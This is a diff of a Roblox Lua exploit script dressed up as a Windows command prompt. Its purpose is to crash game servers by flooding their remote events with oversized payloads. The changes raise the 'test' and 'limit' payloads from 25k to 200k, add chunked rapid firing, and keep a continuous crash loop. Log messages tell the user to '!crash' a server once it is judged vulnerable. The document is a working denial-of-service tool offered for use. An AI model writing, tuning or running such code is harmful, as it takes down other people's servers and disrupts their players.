@@ -100,7 +100,7 @@ local function startCrash(isSpam)
     state.thread = task.spawn(function()
         while state.running do
             pcall(fire)
-            task.wait(0.05) 
+            task.wait(0.05) -- No countdown, just fast continuous crashing
         end
     end)
 end
@@ -316,11 +316,11 @@ local function processCommand(input)
     
     if cmd == "!help" then
         log("Available Commands:", Color3.fromRGB(0, 255, 0))
-        log("  !test           - Check if server is vulnerable (Capped at 25k)", Color3.fromRGB(0, 200, 255))
+        log("  !test           - Check if server is vulnerable (Capped at 200k)", Color3.fromRGB(0, 200, 255))
         log("  !crash          - Start continuous crash (180k)", Color3.fromRGB(200, 200, 200))
         log("  !spam           - Spray ALL remotes at once", Color3.fromRGB(255, 100, 255))
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
-        log("  !limit          - Auto-test (Capped at 25k)", Color3.fromRGB(200, 200, 200))
+        log("  !limit          - Auto-test up to 200k safely", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set target payload size", Color3.fromRGB(200, 200, 200))
         log("  !ping           - Check server ping", Color3.fromRGB(200, 200, 200))
         log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
@@ -338,15 +338,18 @@ local function processCommand(input)
             local wasRunning = state.running
             if wasRunning then stopCrash() end
             
-            -- ✅ TEST CAPPED AT 25K
-            local testSize = 25000
-            log("[*] Firing " .. testSize .. " payload (Max Safe Test)...", Color3.fromRGB(200, 200, 200))
+            -- ✅ TEST CAPPED EXACTLY AT 200K
+            local testSize = 200000
+            local chunks = math.ceil(testSize / ChunkSize)
+            log("[*] Firing " .. testSize .. " payload (Safe Chunking)...", Color3.fromRGB(200, 200, 200))
             
             local before = getPing()
-            local p = buildChunk(testSize)
+            local p = buildChunk()
             
-            pcall(function() remote:FireServer(p) end)
-            task.wait(0.1)
+            for i = 1, chunks do
+                pcall(function() remote:FireServer(p) end)
+                task.wait(0.02)
+            end
             
             log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
             task.wait(3)
@@ -356,7 +359,7 @@ local function processCommand(input)
             
             log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
             
-            if spike > 50 or after > 300 then
+            if spike > 100 or after > 400 then
                 log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
                 log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
             else
@@ -392,7 +395,7 @@ local function processCommand(input)
         log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
         
     elseif cmd == "!limit" then
-        log("[*] Starting Auto-Limit Test (Capped at 25k to prevent kick)...", Color3.fromRGB(0, 200, 255))
+        log("[*] Starting Auto-Limit Test (Pushing up to 200k)...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
             if not remote then return end
@@ -400,15 +403,19 @@ local function processCommand(input)
             local wasRunning = state.running
             if wasRunning then stopCrash() end
             
-            -- ✅ LIMIT CAPPED AT 25K
-            local sizes = {5000, 10000, 15000, 20000, 25000}
-            local bestSize = 5000
+            -- ✅ LIMIT PUSHES TO 200K SAFELY
+            local sizes = {25000, 50000, 100000, 150000, 200000}
+            local bestSize = 25000
             
             for _, sz in ipairs(sizes) do
                 log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
+                local chunks = math.ceil(sz / ChunkSize)
+                local p = buildChunk()
                 
-                local p = buildChunk(sz)
-                pcall(function() remote:FireServer(p) end)
+                for i = 1, chunks do
+                    pcall(function() remote:FireServer(p) end)
+                    task.wait(0.02)
+                end
                 
                 log("[*] Waiting 3s for server to process...", Color3.fromRGB(200, 200, 200))
                 task.wait(3)
@@ -460,7 +467,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: !test and !limit are now safely capped at 25k.", Color3.fromRGB(0, 200, 255))
+log("Pro tip: !test and !limit are now safely capped at 200k.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
